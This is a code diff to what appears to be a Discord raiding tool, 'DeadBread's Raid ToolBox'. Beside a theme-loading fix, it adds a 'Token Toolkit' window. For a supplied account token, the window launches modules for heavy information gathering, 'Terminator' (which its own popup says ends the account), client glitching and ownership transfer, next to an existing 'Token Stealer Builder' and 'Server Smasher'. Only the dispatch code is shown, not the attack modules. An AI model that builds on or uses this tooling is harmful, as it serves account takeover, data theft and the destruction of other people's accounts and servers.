@@ -125,6 +125,15 @@ t0 = time.time()  # Startup Time Counter thanks to https://github.com/Mattlau04
 
 # Load Skin
 import PySimpleGUI as sg
+if not skin == "DeadRed":
+    # Import Default Incase loaded skin has Missing Features/ Compatibility for older skins.
+    mdl = importlib.import_module("themes.DeadRed")
+    if "__all__" in mdl.__dict__:
+        names = mdl.__dict__["__all__"]
+    else:
+        names = [x for x in mdl.__dict__ if not x.startswith("_")]
+    globals().update({k: getattr(mdl, k) for k in names})
+# Import New Skin
 mdl = importlib.import_module("themes.{}".format(skin))
 if "__all__" in mdl.__dict__:
     names = mdl.__dict__["__all__"]
@@ -706,7 +715,7 @@ def main(currentattacks):
         choice = input(colored(">",menu2))
     elif command_line_mode == 0:
         menu_def = [['RTB', ['Attack Manager', 'Themes',['Change Theme', 'Theme Repo'], 'About', ['Info', 'Diagnostics', 'Updater']]],
-                    ['Tokens', ['View/Add Tokens', 'Token Stealer Builder']],
+                    ['Tokens', ['View/Add Tokens', 'Token Stealer Builder', 'Token Toolkit']],
                     ['Help', ['Wiki', 'My YouTube', 'Discord Server', 'Telegram']],
                     ['Server Smasher', ['Launch']],
                     ['Plugins', ['Plugin Support Coming soon. (Use Command Line to access Legacy Plugins)']]
@@ -871,6 +880,15 @@ def main(currentattacks):
                             pass
                         new_skin = values[0]
                         skin = new_skin
+                        if not skin == "DeadRed":
+                            # Import Default Incase loaded skin has Missing Features/ Compatibility for older skins.
+                            mdl = importlib.import_module("themes.DeadRed")
+                            if "__all__" in mdl.__dict__:
+                                names = mdl.__dict__["__all__"]
+                            else:
+                                names = [x for x in mdl.__dict__ if not x.startswith("_")]
+                            globals().update({k: getattr(mdl, k) for k in names})
+                        # Import New Skin
                         mdl = importlib.import_module("themes.{}".format(new_skin))
                         if "__all__" in mdl.__dict__:
                             names = mdl.__dict__["__all__"]
@@ -920,7 +938,7 @@ def main(currentattacks):
                          ]
                 for package in repojson['packages']:
                     links[package['theme_name']] = package['theme_dl_link']
-                    layout.append([sg.Text("{} v{} by {}".format(package['theme_name'],package['theme_version'],package['theme_author']),size=(50,1)), sg.Button("Download",key=package['theme_name'])])
+                    layout.append([sg.Text("{} v{} by {} ({})".format(package['theme_name'],package['theme_version'],package['theme_author'],package['rtb_compatible']),size=(50,1)), sg.Button("Download",key=package['theme_name'])])
                 while True:
                     window.Close()
                     window = sg.Window("DeadBread's Raid ToolBox v{} | Theme Repo".format(rtbversion)).Layout(layout)
@@ -962,6 +980,42 @@ def main(currentattacks):
             elif event == "Token Stealer Builder":
                 p = subprocess.Popen([sys.executable,'RTBFiles/attack_controller.py','StealerBuilder',sys.executable,str(command_line_mode),str(threadcount),str(attacks_theme)],stdout=open("errors.log", "a+"), stderr=subprocess.STDOUT)
                 currentattacks["Token Stealer Builder | Started at: {}".format(datetime.datetime.now().time())] = p.pid
+            elif event == "Token Toolkit":
+                window.Close()
+                layout = [
+                         [sg.Text('Token:')],
+                         [sg.Input(size=(65,1), do_not_clear=True, key="Token"),sg.Button("Info",size=(8,1))],
+                         [sg.Button("Heavy Info Gather",size=(15,1)), sg.Button("Terminator",size=(15,1)), sg.Button("Client Glitcher",size=(15,1)), sg.Button("Ownership Transfer",size=(15,1)),]
+                         ]
+                window = sg.Window("DeadBread's Raid ToolBox v{} | Token Toolkit".format(rtbversion)).Layout(layout)
+                while True:
+                    event, values = window.Read()
+                    if event is None:
+                        window.Close()
+                        main(currentattacks)
+                    elif event == 'Info':
+                        p = subprocess.Popen([sys.executable,'RTBFiles/attack_controller.py','InfoToken',sys.executable,str(command_line_mode),str(threadcount),str(attacks_theme),values['Token']],stdout=open("errors.log", "a+"), stderr=subprocess.STDOUT)
+                        currentattacks["InfoToken | Started at: {}".format(datetime.datetime.now().time())] = p.pid
+                    elif event == 'Heavy Info Gather':
+                        sg.PopupNonBlocking("This May take a while.")
+                        p = subprocess.Popen([sys.executable,'RTBFiles/attack_controller.py','HeavyInfo',sys.executable,str(command_line_mode),str(threadcount),str(attacks_theme),values['Token']],stdout=open("errors.log", "a+"), stderr=subprocess.STDOUT)
+                        currentattacks["Heavy Info Gathering | Started at: {}".format(datetime.datetime.now().time())] = p.pid
+                    elif event == 'Terminator':
+                        e = sg.PopupYesNo("Ay chief you sure? You didn't click this on accident did you?", title="Holup")
+                        if e == "Yes":
+                            e = sg.PopupYesNo("Are you sure?? \nTerminating will stop this account from existing you know.", title="Yikes")
+                            if e == "Yes":
+                                sg.Popup("Welp Here we go.")
+                                p = subprocess.Popen([sys.executable,'RTBFiles/attack_controller.py','Terminator',sys.executable,str(command_line_mode),str(threadcount),str(attacks_theme),values['Token']],stdout=open("errors.log", "a+"), stderr=subprocess.STDOUT)
+                                currentattacks["Terminating a token | Started at: {}".format(datetime.datetime.now().time())] = p.pid
+                    elif event == 'Client Glitcher':
+                        e = sg.PopupYesNo("Are you sure you want to glitch the client this token is\nlogged into?", title="Confirmation")
+                        if e == "Yes":
+                            p = subprocess.Popen([sys.executable,'RTBFiles/attack_controller.py','CG',sys.executable,str(command_line_mode),str(threadcount),str(attacks_theme),values['Token']],stdout=open("errors.log", "a+"), stderr=subprocess.STDOUT)
+                            currentattacks["Client Glitching | Started at: {}".format(datetime.datetime.now().time())] = p.pid
+                    elif event == 'Ownership Transfer':
+                        p = subprocess.Popen([sys.executable,'RTBFiles/attack_controller.py','Ownership',sys.executable,str(command_line_mode),str(threadcount),str(attacks_theme),values['Token']],stdout=open("errors.log", "a+"), stderr=subprocess.STDOUT)
+                        currentattacks["Ownership Transfer | Started at: {}".format(datetime.datetime.now().time())] = p.pid
             elif event == "Launch":
                 window.Close()
                 serversmasher(currentattacks)
